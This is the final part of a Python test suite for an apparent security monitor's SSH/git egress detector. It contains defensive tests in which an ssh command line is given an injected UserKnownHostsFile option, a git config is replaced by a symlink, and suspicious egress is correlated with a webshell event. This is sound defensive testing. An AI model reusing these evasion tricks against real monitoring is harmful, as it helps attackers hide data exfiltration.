            await scan(detector, [(4800, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            assert detector._egress_io.brief_calls == calls, "a cached assessment does no further /proc or file reads"

        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}}, ssh_context_enabled=False)
            install_snapshots({4900: snapshot(4900, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID)})
            meta = detector._process_meta_for(4900)
            assert "is_ssh_client" not in meta and meta["exe_key"] == "/usr/bin/ssh"
            await scan(detector, [(4900, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            assert alerts(published), "ssh_context_enabled=false restores the previous behaviour"
            print("Test 14 (assessment failure -> normal scoring; per-cycle budget + cache bound the work; feature switch works) PASSED")

        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}})
            for i in range(3):
                install_snapshots({5000 + i: snapshot(5000 + i, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID)})
                await scan(detector, [(5000 + i, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            await detector._persist_baseline()
            saved = json.load(open(detector.config.baseline_state_path))
            assert saved["version"] == 1 and saved["ssh_git_baseline"] and saved["outbound_baseline"] is not None
            reloaded, _ = make_detector(tmp, home)
            await reloaded.setup()
            assert reloaded._ssh_baseline.history(f"{USER}|project").is_known("organization/repository")
            old_format = os.path.join(tmp, "old.json")
            json.dump({"version": 1, "outbound_baseline": saved["outbound_baseline"]}, open(old_format, "w"))
            legacy, _ = make_detector(tmp, home, baseline_state_path=old_format)
            await legacy.setup()
            assert len(legacy._ssh_baseline) == 0
            print("Test 15 (ssh baseline persists next to the outbound baseline; files from before this feature still load) PASSED")
    finally:
        outbound_module.read_process_snapshot = original_reader
        OutboundAnomalyDetector._collect_connections = original_collect


def test_17_file_reads_refuse_symlinks_fifos_and_foreign_known_hosts():
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp)
        write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
        io = FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=GIT_PARENT)
        assert assess(proc(repo), io).verdict == sec.VERDICT_VERIFIED
        secret = os.path.join(tmp, "secret.ini")
        with open(secret, "w") as handle:
            handle.write('[remote "origin"]\n\turl = git@github.com:organization/repository.git\n')
        config = os.path.join(repo, ".git", "config")
        os.remove(config)
        os.symlink(secret, config)
        linked = assess(proc(repo), FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=GIT_PARENT))
        assert not linked.legitimate, "a symlinked .git/config is never followed"
        assert sec.EgressIO().read_text(config, 1024) is None
        fifo = os.path.join(tmp, "pipe")
        os.mkfifo(fifo)
        assert sec.EgressIO().read_text(fifo, 1024) is None, "a FIFO must not block or be read"
        assert sec.EgressIO().read_text(secret, 10) == '[remote "o', "regular files are read, bounded"
        os.remove(config)
        make_repo(tmp)
        foreign = os.path.join(tmp, "elsewhere_known_hosts")
        with open(foreign, "w") as handle:
            handle.write("github.com ssh-ed25519 AAAAC3Nza\n")
        write_known_hosts(home, "other.example.org ssh-ed25519 AAAAC3Nza")
        cmd = FETCH_CMD.replace("ssh ", f"ssh -o UserKnownHostsFile={foreign} ", 1)
        result = assess(proc(repo, cmdline=cmd), FakeIO(home, dns={}, procs=GIT_PARENT))
        assert not result.known_hosts_host, "a known_hosts path outside the user's home is ignored"
    print("Test 17 (symlinked git config / FIFOs are never read; a UserKnownHostsFile outside the home is ignored) PASSED")


def test_16_tce_and_config_and_guards():
    config = TceConfig()

    def outbound_event(verdict, *, candidate=False, rules=None):
        return tce.CorrelationCandidateEvent(
            event_id="o1", timestamp=NOW, category="OUTBOUND_ANOMALY", severity="INFO" if candidate else "CRITICAL",
            message="ssh", source_module="outbound_anomaly_detector", user=USER, project="project", rules=rules or [],
            raw_metadata={"ssh_context_verdict": verdict, "baseline_candidate": candidate, "username": USER, "user": USER},
        )
    expected = tce.classify_event(outbound_event(sec.VERDICT_VERIFIED, candidate=True), config)
    assert expected.kind == "Outbound (expected git deployment)" and expected.weight == 0
    suspicious = tce.classify_event(outbound_event(sec.VERDICT_SUSPICIOUS), config)
    assert suspicious.kind == "Suspicious SSH egress" and suspicious.weight == 30
    legit_but_alerting = tce.classify_event(outbound_event(sec.VERDICT_LIKELY, rules=["OUTBOUND_AFTER_PROJECT_FILE_CHANGE"]), config)
    assert legit_but_alerting.kind == "Outbound anomaly", "only baseline candidates are treated as expected"
    webshell = tce.CorrelationCandidateEvent(
        event_id="w1", timestamp=NOW + 1, category="FILE_INTEGRITY_CHANGE", severity="HIGH", message="webshell",
        source_module="webshell_detector", user=USER, project="project", path="/home/x/shell.php", confidence=90,
        raw_metadata={"path": "/home/x/shell.php"},
    )
    classified = [tce.classify_event(e, config) for e in (outbound_event(sec.VERDICT_SUSPICIOUS), webshell)]
    result = tce.score_group(tce.group_classified_events(classified)[0], config)
    assert result.total == 80 and result.tier == "Possible Webshell", (result.total, result.tier)

    cfg = OutboundAnomalyDetectorConfig()
    assert cfg.ssh_context_enabled and cfg.git_remote_min_age_seconds == 3600.0 and "/usr/bin/ssh" in cfg.ssh_client_executables
    import dataclasses
    base = RTSAConfig()
    from config.manager import ConfigManager
    for name, value in (("git_repo_search_depth", 0), ("ssh_assessment_timeout_seconds", 0.0), ("git_remote_min_age_seconds", -1.0), ("ssh_max_assessments_per_cycle", 0), ("ssh_client_executables", ["ssh"])):
        bad = dataclasses.replace(base, modules=dataclasses.replace(base.modules, outbound_anomaly_detector=OutboundAnomalyDetectorConfig(**{name: value})))
        try:
            ConfigManager._validate_semantics(bad)
        except ConfigValidationError as exc:
            assert name in str(exc), str(exc)
        else:
            raise AssertionError(f"{name}={value} must be rejected")

    tree = ast.parse(open("core/ssh_egress_context.py", encoding="utf-8").read())
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            names = [a.name for a in node.names] if isinstance(node, ast.Import) else [node.module or ""]
            assert not {n.split(".")[0] for n in names} & {"subprocess", "shutil", "glob"}, "the assessment must not spawn processes (git is never executed)"
        if isinstance(node, ast.Call):
            func = node.func
            name = func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", "")
            assert name not in {"system", "Popen", "run", "check_output", "walk", "scandir", "create_task", "sleep"}, name
    module_source = open("modules/outbound_anomaly_detector.py", encoding="utf-8").read()
    assert module_source.count("run_periodic(") == 1, "no additional periodic task was added"
    for path in ("config/config.yaml", "config/config2.yaml"):
        text = open(path, encoding="utf-8").read()
        assert "ssh_context_enabled: true" in text, path
    print("Test 16 (TCE: expected git deployment weighs 0, suspicious ssh + webshell = Possible Webshell; config validation; no subprocess/scan/loop) PASSED")


def main():
    test_1_parsers()
    test_2_legitimate_github_deployment_verified()
    test_3_github_address_alone_never_helps()
    test_4_hard_indicators_override_github()
    test_5_repository_and_remote_consistency()
    test_6_destination_mismatch_and_dns_scope()
    test_7_ssh_github_port_443_insteadof_and_clone()
    test_8_baseline_learns_only_verified_and_persists()
    asyncio.run(detector_tests())
    test_16_tce_and_config_and_guards()
    test_17_file_reads_refuse_symlinks_fifos_and_foreign_known_hosts()
    print("\nALL OUTBOUND SSH/GIT CONTEXT TESTS PASSED")


if __name__ == "__main__":
    main()
